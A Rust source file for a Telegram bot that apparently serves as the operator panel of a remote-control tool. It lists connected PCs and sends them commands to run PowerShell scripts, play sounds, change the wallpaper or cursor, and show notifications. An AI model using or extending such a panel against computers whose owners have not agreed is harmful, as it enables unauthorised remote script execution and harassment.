pub mod callbacks {
    use std::fs;
    use std::path::Path;
    use std::sync::Arc;
    use teloxide::{Bot};
    use teloxide::payloads::{AnswerCallbackQuerySetters, EditMessageReplyMarkupSetters, EditMessageTextSetters};
    use teloxide::prelude::{CallbackQuery, ChatId, Requester, ResponseResult};
    use teloxide::types::{InlineKeyboardButton, InlineKeyboardMarkup, MessageId, ParseMode};
    use tokio::sync::{Mutex, MutexGuard};
    use crate::app::app::{AppState, RPTClient, SCRIPTS_PATH};
    use crate::core::command::command::RPTCommand;
    use crate::core::enums::command_types::commands::RPTCommandType;
    use crate::telegram::dialogs::change_cursor::change_cursor::{ChangeCursor, ChangeCursorDialogue, ChangeCursorState};
    use crate::telegram::dialogs::change_wallpaper::change_wallpaper::{ChangeWallpaper, ChangeWallpaperDialogue, ChangeWallpaperState};
    use crate::telegram::dialogs::send_notify_dialog::notify_dialog::{NotificationData, NotificationEditorDialogue, NotificationEditorState};
    use crate::telegram::ui::ui::{show_audio_ui, show_client_menu, show_notification_editor, show_scripts, show_send_change_wallpaper, show_send_cursor};

    pub async fn get_client_by_id(id: String, state: Arc<Mutex<AppState>>) -> RPTClient{
        let state = state.lock().await;
        state.clients.iter().find(|x| x.id == id).cloned().unwrap_or_default()
    }

    pub async fn show_clients(bot: &Bot, q: &CallbackQuery, state: MutexGuard<'_, AppState>) {
        let chat_id = ChatId(q.clone().from.id.0 as i64);
        let message = q.message.clone().unwrap().id();

        if state.clients.len() > 0 {
            let mut clients_button = InlineKeyboardMarkup::default();
            let max = 3;
            let mut line: Vec<InlineKeyboardButton> = Vec::new();
            for client in &state.clients {
                line.push(InlineKeyboardButton::callback(format!("{}({})", client.pc_name, client.address),format!("open_client|{}", client.id)));
                if line.len() == max {
                    clients_button.inline_keyboard.push(line.clone());
                    line.clear();
                }
            }

            if clients_button.inline_keyboard.len() == 0 { clients_button.inline_keyboard.push(line.clone()); }
            let _ = bot.edit_message_text(chat_id, message, format!("Клиенты в сети (всего: {})", state.clients.len())).parse_mode(ParseMode::Html).await;
            let _ = bot.edit_message_reply_markup(chat_id, message).reply_markup(clients_button).await;
        } else {
            let _ = bot.edit_message_text(chat_id, message, "Сейчас нету клиентов в сети").await;
        }
    }

    pub async fn open_client(bot: &Bot, id: String, state: Arc<Mutex<AppState>>, q: &CallbackQuery) {
        let mut client = RPTClient::default();
        {
            let state = state.lock().await;
            client = state.clients.iter().find(|x| x.id == id).cloned().unwrap_or_default();
        }
        let replace = show_client_menu(&client);
        let chat_id = ChatId(q.clone().from.id.0 as i64);
        let message = q.message.clone().unwrap().id();

        bot.edit_message_text(chat_id, message, replace.0).parse_mode(ParseMode::Html).await.expect("");
        bot.edit_message_reply_markup(chat_id, message).reply_markup(replace.1).await.expect("");

        bot.answer_callback_query(q.id.clone()).await.expect("");
    }

    // Main buttons
    pub async fn clients_buttons_callback_handler(bot: Bot, q: CallbackQuery, state: Arc<Mutex<AppState>>, notify_dialog: NotificationEditorDialogue, change_wallpaper: ChangeWallpaperDialogue,
    change_cursor: ChangeCursorDialogue) -> ResponseResult<()> {
        if let Some(data) = q.clone().data {
            // Open Client Button
            if data.starts_with("open_client|") {
                // reseting all dialogues
                notify_dialog.reset().await.expect("Failed to reset notify dialog");
                change_cursor.reset().await.expect("Failed to reset change cursor");
                change_wallpaper.reset().await.expect("Failed to reset change wallpaper");

                let id = data.trim_start_matches("open_client|");
                open_client(&bot, id.parse().unwrap(), state, &q).await;
                bot.answer_callback_query(q.id).await?;
            }
            // Send Notify button
            else if data.starts_with("send_message|") {
                let id = data.trim_start_matches("send_message|");
                let notify_data = NotificationData::default().set_id(id);
                let client = get_client_by_id(id.to_string(), Arc::clone(&state)).await;
                let replace = show_notification_editor(client.id, Some(notify_data.clone()));
                let chat_id = ChatId(q.clone().from.id.0 as i64);
                let message = q.message.unwrap().id();

                // update notify dialog
                notify_dialog.update(NotificationEditorState::NotifyEditorStart {notification_data: notify_data, message_id: message}).await.expect("Failed to send notify dialog");

                // update message
                bot.edit_message_text(chat_id, message, replace.0).parse_mode(ParseMode::Html).await?;
                bot.edit_message_reply_markup(chat_id, message).reply_markup(replace.1.unwrap()).await?;
                bot.answer_callback_query(q.id).await?;
            }
            // Change Cursor Button
            else if data.starts_with("change_cursor|") {
                let id = data.trim_start_matches("change_cursor|");
                let client = get_client_by_id(id.to_string(), state).await;

                let replace = show_send_cursor();
                let chat_id = ChatId(q.clone().from.id.0 as i64);
                let message = q.message.clone().unwrap().id();
                let cursor = ChangeCursor {data: Vec::new(), client};
                change_cursor.update(ChangeCursorState::ChangeCursorSend {change_cursor: cursor}).await.expect("Failed to change dialogue");
                bot.edit_message_text(chat_id, message, replace.0).await.expect("");
                bot.edit_message_reply_markup(chat_id, message).reply_markup(replace.1).await.expect("");
                bot.answer_callback_query(q.id).await?;
            }
            // Exit button
            else if data.starts_with("show_clients") {
                let state = state.lock().await;
                show_clients(&bot, &q, state).await;
                bot.answer_callback_query(q.id).await?;
            }
            // Change wallpaper button
            else if data.starts_with("change_wallpaper|") {
                let id = data.trim_start_matches("change_wallpaper|");
                let client = get_client_by_id(id.to_string(), Arc::clone(&state)).await;
                let replace = show_send_change_wallpaper();

                let chat_id = ChatId(q.clone().from.id.0 as i64);
                let message = q.message.unwrap().id();

                let a = ChangeWallpaper {
                    data: vec![],
                    client,
                };

                change_wallpaper.update(ChangeWallpaperState::ChangeWallpaperSend {change_wallpaper: a}).await.expect("Failed to change wallpaper");

                // update menu
                bot.edit_message_text(chat_id, message, replace.0).await?;
                bot.edit_message_reply_markup(chat_id, message).reply_markup(replace.1.unwrap()).await?;
                bot.answer_callback_query(q.id).await?;
            }
            // Open Script Menu
            else if data.starts_with("open_scripts|") {
                let id = data.trim_start_matches("open_scripts|");
                let client = get_client_by_id(id.to_string(), Arc::clone(&state)).await;
                let replace = show_scripts(client, Arc::clone(&state)).await;

                let chat_id = ChatId(q.clone().from.id.0 as i64);
                let message = q.message.unwrap().id();

                // update menu
                bot.edit_message_text(chat_id, message, replace.0).await?;
                bot.edit_message_reply_markup(chat_id, message).reply_markup(replace.1).await?;
                bot.answer_callback_query(q.id).await?;
            }
            // Run Script
            else if data.starts_with("run_script|") {
                let run_script_data = data.trim_start_matches("run_script|");
                let splitted_data = run_script_data.split("&&&").collect::<Vec<&str>>();
                let (script_id, client_id) = (splitted_data[0], splitted_data[1]);
                let mut client = get_client_by_id(client_id.to_string(), Arc::clone(&state)).await;
                let script_bytes = fs::read_to_string(Path::new(&format!("{}{}.ps1", SCRIPTS_PATH, script_id)));
                let byted = script_bytes.unwrap().into_bytes();

                let command = RPTCommand {
                    rpt_type: RPTCommandType::RunScript,
                    data: byted,
                    flags: vec![],
                };

                // update menu
                let chat_id = ChatId(q.clone().from.id.0 as i64);
                let message = q.message.unwrap().id();
                let replace = show_scripts(client.clone(), Arc::clone(&state)).await;
                bot.edit_message_text(chat_id, message, replace.0).await?;
                bot.edit_message_reply_markup(chat_id, message).reply_markup(replace.1).await?;

                // send command
                client.channel.unwrap().send(command).await.expect("Failed to send command");

                {
                    let mut state = state.lock().await;
                    let client_1: &mut RPTClient = state.clients.iter_mut().find(|x| x.id == client_id).unwrap();
                    client_1.runned_scripts.push(script_id.to_string());
                }

                bot.answer_callback_query(q.id).show_alert(true).text("Скрипт успешно запущен!").await?;
            }
            // Play Audio Button
            else if data.starts_with("audio|") {
                let id = data.trim_start_matches("audio|");

                // update menu
                let chat_id = ChatId(q.clone().from.id.0 as i64);
                let message = q.message.unwrap().id();
                let replace = show_audio_ui(id.to_string(), Arc::clone(&state)).await;

                bot.edit_message_text(chat_id, message, replace.0).await?;
                bot.edit_message_reply_markup(chat_id, message).reply_markup(replace.1).await?;

                bot.answer_callback_query(q.id).await?;
            }
            // Play Audio
            else if data.starts_with("pl_au|") {
                let send_data = data.trim_start_matches("pl_au|");
                let new_send_data = send_data.split("&&&").collect::<Vec<&str>>();
                let (client_id, file_id) = (new_send_data[0], new_send_data[1]);
                let sound_list = {
                    let app = state.lock().await;
                    app.sounds.clone()
                };

                let mut client = get_client_by_id(client_id.to_string(), Arc::clone(&state)).await;
                let audio_file = fs::read(format!("sounds/{}", sound_list.get(&file_id.parse::<i32>().unwrap()).expect("failed get sound path"))).expect("");

                let command = RPTCommand {
                    rpt_type: RPTCommandType::PlayAudio,
                    data: audio_file,
                    flags: vec![],
                };
                client.channel.unwrap().send(command).await.expect("Failed to send command");
                bot.answer_callback_query(q.id).show_alert(true).text("Звук воспроизводится!").await?;
            }
        }
        Ok(())
    }

    // Send windows notification to client
    pub async fn notify_editor_callbacks(bot: Bot, q: CallbackQuery, state: Arc<Mutex<AppState>>, dialogue: NotificationEditorDialogue, (notification_data, _): (NotificationData, MessageId)) -> ResponseResult<()> {
        if let Some(data) = q.clone().data {
            // Title editor
            if data == "notify_editor_edit_title" {
                let message = q.message.unwrap().id();
                dialogue.update(NotificationEditorState::NotifyEditorTitle {notification_data, message_id: message}).await.expect("Failed to send notify dialog");

                bot.answer_callback_query(q.id).await?;
            }
            // Body text editor
            else if data == "notify_editor_edit_text" {
                let message = q.message.unwrap().id();
                dialogue.update(NotificationEditorState::NotifyEditorText {notification_data, message_id: message}).await.expect("Failed to send notify dialog");

                bot.answer_callback_query(q.id).await?;
            }
            // Back to client menu
            else if data.starts_with("open_client|") {
                dialogue.reset().await.expect("Failed to reset notify dialog");
                let id = data.trim_start_matches("open_client|");
                open_client(&bot, id.parse().unwrap(), state, &q).await;

                bot.answer_callback_query(q.id).await?;
            }
            // Send notify to client
            else if data.starts_with("send_notify") {
                let (id, title, data) = (notification_data.id, notification_data.title, notification_data.message);
                let client = get_client_by_id(id.to_string(), Arc::clone(&state)).await;
                let command: RPTCommand = RPTCommand {
                    rpt_type: RPTCommandType::WinMessage,
                    data: format!("{}<split>{}", title, data).into_bytes(),
                    flags: vec![],
                };

                // sending to client channel
                client.channel.unwrap().send(command).await.unwrap();

                bot.answer_callback_query(q.id).show_alert(true).text("Сообщение отправлено!").await?;
            }
        }
        Ok(())
    }

    // Send change cursor
    pub async fn change_cursor_callbacks(bot: Bot, q: CallbackQuery, state: Arc<Mutex<AppState>>, dialogue: ChangeCursorDialogue, change_cursor_data: ChangeCursor) -> ResponseResult<()> {
        if let Some(data) = q.clone().data {
            let client = change_cursor_data.client;

            if data == "send" {
                if !change_cursor_data.data.is_empty() {
                    let command = RPTCommand {
                        rpt_type: RPTCommandType::ChangeCursor,
                        data: change_cursor_data.data,
                        flags: vec![],
                    };
                    client.channel.unwrap().send(command).await.unwrap();
                    open_client(&bot, client.id, state, &q).await;
                    dialogue.exit().await.expect("Failed to exit dialogue");

                    bot.answer_callback_query(q.id.clone()).show_alert(true).text("Курсор был изменён!").await?;
                }
            }
            else if data == "exit" {
                dialogue.exit().await.expect("Failed to exit dialogue");
                open_client(&bot, client.id, state, &q).await;
                bot.answer_callback_query(q.id).await?;
            }
            else if data == "set_max" {
                let command = RPTCommand {
                    rpt_type: RPTCommandType::ChangeCursor,
                    data: Vec::from(15_u32.to_be_bytes()),
                    flags: vec!["SET_SIZE".to_string()],
                };
                client.channel.unwrap().send(command).await.unwrap();
                open_client(&bot, client.id, state, &q).await;
                dialogue.exit().await.expect("Failed to exit dialogue");

                bot.answer_callback_query(q.id.clone()).show_alert(true).text("Курсор был изменён!").await?;
            }
            else if data == "set_min" {
                let command = RPTCommand {
                    rpt_type: RPTCommandType::ChangeCursor,
                    data: Vec::from(1_u32.to_be_bytes()),
                    flags: vec!["SET_SIZE".to_string()],
                };
                client.channel.unwrap().send(command).await.unwrap();
                open_client(&bot, client.id, state, &q).await;
                dialogue.exit().await.expect("Failed to exit dialogue");

                bot.answer_callback_query(q.id.clone()).show_alert(true).text("Курсор был изменён!").await?;
            }
            else if data == "reset" {
                let command = RPTCommand {
                    rpt_type: RPTCommandType::ChangeCursor,
                    data: Vec::new(),
                    flags: vec![String::from("RESET")],
                };
                client.channel.unwrap().send(command).await.unwrap();
                dialogue.exit().await.expect("Failed to exit dialogue");
                open_client(&bot, client.id, state, &q).await;
                bot.answer_callback_query(q.id.clone()).show_alert(true).text("Курсор был сброшен по умолчанию").await?;
            }
        }
        Ok(())
    }

    // Send change wallpaper
    pub async fn change_wallpaper_callbacks(bot: Bot, q: CallbackQuery, state: Arc<Mutex<AppState>>, dialogue: ChangeWallpaperDialogue, change_wallpaper: ChangeWallpaper) -> ResponseResult<()> {
        if let Some(data) = q.clone().data {
            if data == "send" {
                let client = change_wallpaper.client;
                if !change_wallpaper.data.is_empty() {
                    let command = RPTCommand {
                        rpt_type: RPTCommandType::ChangeWallpaper,
                        data: change_wallpaper.data,
                        flags: vec![],
                    };
                    client.clone().channel.unwrap().send(command).await.unwrap();
                }
                bot.answer_callback_query(q.id.clone()).show_alert(true).text("Обои изменены!").await?;
                open_client(&bot, client.id, state, &q).await;
                dialogue.exit().await.expect("Failed to exit dialogue");
            } else if data == "cancel" {
                dialogue.exit().await.expect("Failed to exit dialogue");
                open_client(&bot, change_wallpaper.client.id, state, &q).await;
                bot.answer_callback_query(q.id).await?;
            }
        }

        Ok(())
    }
}